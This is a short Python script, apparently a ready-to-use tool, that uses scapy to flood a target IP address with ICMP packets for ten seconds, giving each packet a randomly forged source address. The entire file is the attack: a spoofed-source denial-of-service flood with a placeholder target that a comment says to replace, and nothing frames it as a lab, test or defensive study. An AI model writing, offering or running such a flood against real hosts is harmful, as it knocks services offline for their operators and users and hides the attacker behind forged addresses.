from scapy.all import *
import random
import time

target_ip = "127.0.0.1"  # Replace with the target IP
duration = 10  # Duration of the flood in seconds
end_time = time.time() + duration

while time.time() < end_time:
    fake_ip = RandIP()  # Generate a random source IP
    packet = IP(src=fake_ip, dst=target_ip) / ICMP()  # Create an ICMP packet
    send(packet, verbose=0)  # Send the packet
